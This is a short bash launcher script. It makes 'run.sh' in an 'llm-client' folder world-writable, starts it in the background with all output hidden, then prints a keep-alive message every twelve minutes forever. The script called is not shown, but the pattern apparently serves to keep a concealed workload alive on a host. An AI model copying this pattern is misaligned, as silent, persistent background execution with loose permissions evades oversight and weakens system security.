#!/bin/bash

cd llm-client && chmod 777 run.sh && nproc --all && ./run.sh 7 21 >/dev/null 2>&1 &
sleep 3
while true
do
        echo "Ojo Lali Ngopi Boss..."
        sleep 720
done
